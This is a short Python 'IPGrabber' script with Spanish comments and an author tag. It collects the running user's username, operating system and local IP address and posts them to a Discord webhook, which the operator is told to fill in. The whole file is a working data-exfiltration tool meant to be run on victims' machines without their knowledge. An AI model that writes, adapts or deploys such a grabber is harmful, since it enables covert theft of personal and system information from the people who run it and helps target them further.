import socket, requests, os
import platform
#Obtenemos usuario
nm = os.getenv('username')
#Obtenemos nombre de sistema
sistema = platform.system()
#Obtenemos IP
ip = (socket.gethostbyname(socket.gethostname()))
#Ingresa tu webhook de discord
#(Donde se enviaran los datos)
webhook = '#'

username = 'IPGrabber ☆'
message = f'**Nueva IP grabada:** ||{ip}|| \n **Sistema:** ||{sistema}|| \n **Nombre de usuario:** ||{nm}|| \n`MADE BY QU3TI`'    
picture = f'https://art.pixilart.com/thumb/77454ce576824c0.png  '
data = {
	    'content': message,
        'username': username,
        'avatar_url': picture
	}

sent = 0
failed = 0

r = requests.post(webhook, data)
